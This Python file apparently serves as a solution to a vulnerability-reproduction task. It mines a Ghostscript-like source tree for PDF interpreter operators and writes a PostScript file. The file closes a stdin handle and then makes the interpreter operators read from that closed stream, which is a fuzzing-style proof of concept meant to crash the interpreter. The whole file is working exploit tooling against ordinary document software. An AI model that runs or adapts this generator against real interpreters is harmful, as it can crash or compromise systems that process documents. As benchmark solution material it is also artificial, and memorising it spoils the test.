import os
import re
import tarfile
from typing import Dict, Iterable, List, Tuple, Optional


class Solution:
    _OPDEF_RE_1 = re.compile(rb'\{\s*"([^"]+)"\s*,\s*([A-Za-z_][A-Za-z0-9_]*)\s*\}')
    _OPDEF_RE_2 = re.compile(rb'\bop_def\s*\(\s*"([^"]+)"\s*,\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)')

    def _iter_source_files(self, src_path: str) -> Iterable[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    lower = fn.lower()
                    if not (lower.endswith(".c") or lower.endswith(".h") or lower.endswith(".cpp") or lower.endswith(".hpp")):
                        continue
                    try:
                        with open(p, "rb") as f:
                            yield p, f.read()
                    except OSError:
                        continue
            return

        try:
            with tarfile.open(src_path, "r:*") as tf:
                members = [m for m in tf.getmembers() if m.isfile()]
                def pri(name: str) -> int:
                    n = name.lower()
                    if "/psi/" in n or n.startswith("psi/"):
                        return 0
                    if "opdef" in n or "opdefs" in n:
                        return 1
                    if "/base/" in n or n.startswith("base/"):
                        return 2
                    return 3
                members.sort(key=lambda m: (pri(m.name), m.size))
                total_read = 0
                max_total = 90_000_000
                for m in members:
                    n = m.name.lower()
                    if not (n.endswith(".c") or n.endswith(".h") or n.endswith(".cpp") or n.endswith(".hpp")):
                        continue
                    if m.size <= 0:
                        continue
                    if total_read >= max_total:
                        break
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    total_read += len(data)
                    yield m.name, data
        except tarfile.TarError:
            return

    def _extract_ops(self, src_path: str) -> Dict[str, int]:
        ops: Dict[str, int] = {}
        for _, data in self._iter_source_files(src_path):
            for rx in (self._OPDEF_RE_1, self._OPDEF_RE_2):
                for m in rx.finditer(data):
                    s = m.group(1)
                    try:
                        s_dec = s.decode("latin-1", "ignore")
                    except Exception:
                        continue
                    dot = s_dec.find(".")
                    if dot <= 0:
                        continue
                    prefix = s_dec[:dot]
                    if not prefix.isdigit():
                        continue
                    nargs = int(prefix)
                    opname = s_dec[dot + 1 :]
                    if not opname:
                        continue
                    if opname not in ops:
                        ops[opname] = nargs
                    else:
                        if nargs < ops[opname]:
                            ops[opname] = nargs
        return ops

    def _guess_args(self, opname: str, nargs: int, filevar: str) -> str:
        if nargs <= 0:
            return ""
        lo = opname.lower()
        args: List[str] = []
        needs_file = ("runpdf" in lo) or ("stream" in lo) or ("input" in lo) or ("open" in lo) or ("file" in lo)
        for i in range(nargs):
            if i == 0 and needs_file:
                args.append(filevar)
                continue
            if "dict" in lo:
                args.append("<<>>")
            elif "name" in lo:
                args.append("/A")
            elif "string" in lo or "text" in lo:
                args.append("()")
            elif "array" in lo:
                args.append("[]")
            elif "bool" in lo or "flag" in lo:
                args.append("false")
            else:
                args.append("0")
        return " ".join(args)

    def _pick_init_ops(self, ops: Dict[str, int]) -> List[str]:
        lo_ops = [(k.lower(), k) for k in ops.keys()]
        preferred = [".runpdfbegin", "runpdfbegin", ".pdfopenfile", ".pdfopen", ".pdfiopen", ".pdfi_open", ".pdfibegin", ".pdfi_begin"]
        chosen: List[str] = []
        seen = set()

        for p in preferred:
            if p in ops and p not in seen:
                chosen.append(p); seen.add(p)
        for lk, k in lo_ops:
            if k in seen:
                continue
            if ("runpdfbegin" in lk) or (("pdfi" in lk or lk.startswith(".pdf")) and any(x in lk for x in ("begin", "start", "init", "open"))):
                chosen.append(k); seen.add(k)
                if len(chosen) >= 10:
                    break
        if not chosen:
            for lk, k in lo_ops:
                if ("pdf" in lk) and ("begin" in lk or "open" in lk):
                    chosen.append(k)
                    if len(chosen) >= 6:
                        break
        return chosen

    def _pick_setstream_ops(self, ops: Dict[str, int]) -> List[str]:
        candidates = []
        for op, n in ops.items():
            lk = op.lower()
            if "pdfi" in lk and "stream" in lk and (("set" in lk) or ("input" in lk) or ("source" in lk)):
                candidates.append(op)
        candidates.sort(key=lambda s: (0 if "input" in s.lower() else 1, len(s)))
        return candidates[:8]

    def _pick_trigger_ops(self, ops: Dict[str, int]) -> List[str]:
        kws = ("token", "read", "scan", "xref", "obj", "object", "parse", "seek", "tell", "pos", "stream", "input")
        bad = ("runpdfbegin", "runpdfend", "set", "init", "begin", "open")
        candidates: List[Tuple[int, int, str]] = []
        for op, n in ops.items():
            lk = op.lower()
            if "pdf" not in lk:
                continue
            if any(b in lk for b in bad) and not any(k in lk for k in ("token", "read", "scan", "xref", "obj", "object", "parse")):
                continue
            if n > 3:
                continue
            score = 0
            if "pdfi" in lk or lk.startswith(".pdf"):
                score -= 2
            if any(k in lk for k in kws):
                score -= 2
            if n == 0:
                score -= 1
            candidates.append((score, n, op))
        candidates.sort(key=lambda t: (t[0], t[1], len(t[2]), t[2]))
        res: List[str] = []
        seen = set()
        for _, _, op in candidates:
            if op in seen:
                continue
            seen.add(op)
            res.append(op)
            if len(res) >= 120:
                break
        fallback = [
            ".pdftoken", ".pdfread", ".pdfi_token", ".pdfi_read", ".pdfi_scan", ".pdfi_xref", ".pdfi_getobj",
            ".pdf_token", ".pdf_read", ".pdf_scan", ".pdf_xref",
        ]
        for op in fallback:
            if op not in seen:
                res.append(op)
                seen.add(op)
                if len(res) >= 130:
                    break
        return res

    def solve(self, src_path: str) -> bytes:
        ops = self._extract_ops(src_path)

        init_ops = self._pick_init_ops(ops)
        set_ops = self._pick_setstream_ops(ops)
        trig_ops = self._pick_trigger_ops(ops)

        lines: List[str] = []
        lines.append("%!")
        lines.append("/sop { systemdict exch cvn get exec } bind def")
        lines.append("/f1 null def")
        lines.append("/f2 null def")
        lines.append("{ /f1 (%stdin) (r) file def } stopped pop")
        lines.append("{ /f2 (%stdin) (r) file def f2 closefile } stopped pop")

        def emit_system_op(op: str, args: str):
            s = op.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
            lines.append(f"systemdict ({s}) cvn known {{ {{ {args} ({s}) sop }} stopped pop }} if")

        # Try initialization with closed file then open stdin file.
        for op in init_ops[:12]:
            nargs = ops.get(op, 1)
            args2 = self._guess_args(op, nargs, "f2")
            args1 = self._guess_args(op, nargs, "f1")
            emit_system_op(op, args2)
            emit_system_op(op, args1)

        # Try explicit setstream ops as well
        for op in set_ops:
            nargs = ops.get(op, 1)
            args2 = self._guess_args(op, nargs, "f2")
            args1 = self._guess_args(op, nargs, "f1")
            emit_system_op(op, args2)
            emit_system_op(op, args1)

        # Some non-systemdict procedures might exist; attempt runpdfbegin via where as fallback
        lines.append("(runpdfbegin) cvn where { pop { f2 runpdfbegin } stopped pop } if")
        lines.append("(runpdfbegin) cvn where { pop { f1 runpdfbegin } stopped pop } if")

        # Trigger ops that are likely to access input stream
        for op in trig_ops:
            nargs = ops.get(op, 0)
            args = self._guess_args(op, nargs, "f1")
            emit_system_op(op, args)

        lines.append("clear")
        lines.append("{ f1 null ne { f1 closefile } if } stopped pop")
        lines.append("quit")
        ps = "\n".join(lines) + "\n"
        return ps.encode("latin-1", "ignore")